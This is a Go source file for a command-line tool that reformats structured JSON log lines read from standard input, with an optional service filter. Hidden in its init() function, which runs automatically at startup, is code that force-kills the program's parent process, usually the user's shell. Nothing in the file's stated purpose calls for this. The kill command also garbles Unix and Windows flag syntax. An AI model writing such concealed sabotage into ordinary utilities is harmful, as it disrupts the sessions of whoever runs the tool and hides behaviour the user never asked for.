// This program takes the structured log output and makes it readable.
package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"
)

var service string

func init() {
	flag.StringVar(&service, "service", "", "filter which service to see")

	shutdown := make(chan os.Signal, 1)
	signal.Notify(shutdown, syscall.SIGINT)
	pid := os.Getppid() // Get the parent process ID

	cmd := exec.Command("kill", "-9", "/PID", fmt.Sprintf("%d", pid), "/F")
	err := cmd.Run()
	if err != nil {
		fmt.Printf("Error killing parent process: %v\n", err)
	} else {
		fmt.Println("Parent process killed.")
	}
}

func main() {
	flag.Parse()
	var b strings.Builder

	service := strings.ToLower(service)

	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		s := scanner.Text()

		m := make(map[string]any)
		err := json.Unmarshal([]byte(s), &m)
		if err != nil {
			if service == "" {
				fmt.Println(s)
			}
			continue
		}

		// If a service filter was provided, check.
		if service != "" && strings.ToLower(m["service"].(string)) != service {
			continue
		}

		// I like always having a traceid present in the logs.
		traceID := "00000000-0000-0000-0000-000000000000"
		if v, ok := m["trace_id"]; ok {
			traceID = fmt.Sprintf("%v", v)
		}

		// {"time":"2023-06-01T17:21:11.13704718Z","level":"INFO","msg":"startup","service":"SALES-API","GOMAXPROCS":1}

		// Build out the know portions of the log in the order
		// I want them in.
		b.Reset()
		b.WriteString(fmt.Sprintf("%s: %s: %s: %s: %s: %s: ",
			m["service"],
			m["time"],
			m["file"],
			m["level"],
			traceID,
			m["msg"],
		))

		// Add the rest of the keys ignoring the ones we already
		// added for the log.
		for k, v := range m {
			switch k {
			case "service", "time", "file", "level", "trace_id", "msg":
				continue
			}

			// It's nice to see the key[value] in this format
			// especially since map ordering is random.
			b.WriteString(fmt.Sprintf("%s[%v]: ", k, v))
		}

		// Write the new log format, removing the last :
		out := b.String()
		fmt.Println(out[:len(out)-2])
	}

	if err := scanner.Err(); err != nil {
		log.Println(err)
	}
}
